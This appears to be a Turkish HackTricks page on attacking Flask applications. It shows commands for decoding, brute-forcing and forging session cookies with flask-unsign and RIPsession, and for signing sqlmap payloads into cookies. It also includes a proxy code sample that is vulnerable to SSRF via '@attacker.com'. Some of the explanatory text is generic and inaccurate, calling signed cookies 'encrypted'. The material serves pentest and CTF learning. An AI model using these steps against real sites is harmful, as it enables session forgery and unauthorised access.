# Flask

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine çıkarın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Muhtemelen bir CTF oynuyorsanız, bir Flask uygulaması** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)** ile ilgili olacaktır.**

## Çerezler

Varsayılan çerez oturum adı **`session`**'dır.

### Decoder

Çevrimiçi Flask çerez çözücüsü: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manuel

Çerezin ilk noktaya kadar olan ilk kısmını alın ve Base64 ile çözün>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Çerez ayrıca bir şifre kullanılarak imzalanır

### **Flask-Unsign**

Tahmin edilen gizli anahtarları kullanarak bir Flask uygulamasının oturum çerezlerini almak, çözmek, brute-force yapmak ve oluşturmak için komut satırı aracı.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Çerezin Şifresini Çözme**

Bir web uygulamasında, bazen çerezlerde saklanan bilgileri anlamak önemli olabilir. Flask gibi bazı web çerçeveleri, çerezleri şifreleyerek saklar. Bu durumda, çerezin şifresini çözmek için aşağıdaki adımları izleyebilirsiniz:

1. İlk olarak, çerezin değerini alın. Bu genellikle `document.cookie` kullanılarak JavaScript tarafından yapılır.
2. Şifrelenmiş çerezin değerini alın ve Base64 çözümlemesi yapın. Bu, şifrelenmiş veriyi orijinal haline dönüştürmenizi sağlar.
3. Şifrelenmiş veriyi çözümleyin. Flask gibi bir çerçeve kullanıyorsanız, genellikle `itsdangerous` modülü kullanılarak çerezler şifrelenir. Bu modülü kullanarak çerezin şifresini çözebilirsiniz.
4. Şifresi çözülmüş veriyi elde edin ve içeriğini inceleyin. Bu, çerezde saklanan bilgileri anlamanıza yardımcı olacaktır.

Bu adımları takip ederek, şifrelenmiş bir çerezin içeriğini çözebilir ve çerezde saklanan bilgilere erişebilirsiniz.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Brute Force (Kaba Kuvvet)**

Brute force saldırısı, bir hedefin şifresini veya kimlik doğrulama bilgilerini tahmin etmek için tüm olası kombinasyonları denemek amacıyla kullanılan bir saldırı yöntemidir. Bu saldırı yöntemi, genellikle zayıf veya tahmin edilebilir şifrelerin kullanıldığı durumlarda etkili olabilir. Brute force saldırıları, oturum açma formlarında, şifre korumalı dosyalarda veya ağ cihazlarında kullanıcı adı ve şifre kombinasyonlarını denemek için kullanılabilir. Bu saldırı yöntemi, tüm olası kombinasyonları denemek için büyük bir hesaplama gücü gerektirir ve genellikle zaman alıcı bir süreçtir.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **İmzalama**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Eski Sürümlerle İmzalama

Flask, eski sürümlerde kullanılan bir imzalama yöntemine sahiptir. Bu yöntem, `itsdangerous` kütüphanesini kullanarak verileri imzalar. Bu imzalama yöntemi, güvenlik açıklarına neden olabileceği için güncel sürümlerde önerilmez. Ancak, bazı durumlarda eski sürümlerle çalışmak zorunda kalabilirsiniz.

Eski sürümlerde imzalama yapmak için aşağıdaki adımları izleyebilirsiniz:

1. `itsdangerous` kütüphanesini yükleyin:

```bash
pip install itsdangerous==0.24
```

2. İmzalama anahtarınızı oluşturun:

```python
from itsdangerous import URLSafeTimedSerializer

secret_key = "your_secret_key"
serializer = URLSafeTimedSerializer(secret_key)
```

3. Verileri imzalayın:

```python
data = "your_data"
signed_data = serializer.dumps(data)
```

4. İmzalı veriyi doğrulayın:

```python
original_data = serializer.loads(signed_data)
```

Bu yöntemle imzalanan veriler, `itsdangerous` kütüphanesinin eski sürümlerinde doğrulanabilir. Ancak, güvenlik açıkları nedeniyle bu yöntemi kullanmaktan kaçınmanız önerilir.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Flask-unsign ile oluşturulan çerezler kullanarak web sitelerini brute-force etmek için komut satırı aracı.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### Flask session çerezinde SQLi, SQLmap ile

[**Bu örnek**](../../pentesting-web/sql-injection/sqlmap/#eval), bilinen bir sır kullanarak Flask için sqlmap payloadlarını otomatik olarak imzalamak için sqlmap `eval` seçeneğini kullanır.

## Flask Proxy ile SSRF

[**Bu yazıda**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies), Flask'ın "@" karakteri ile başlayan bir isteği nasıl kabul ettiği açıklanmaktadır.
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
Aşağıdaki senaryoda hangisi:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
**SSRF**'ye neden olmak için "@attacker.com" gibi bir şeyi tanıtmaya izin verilebilir.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
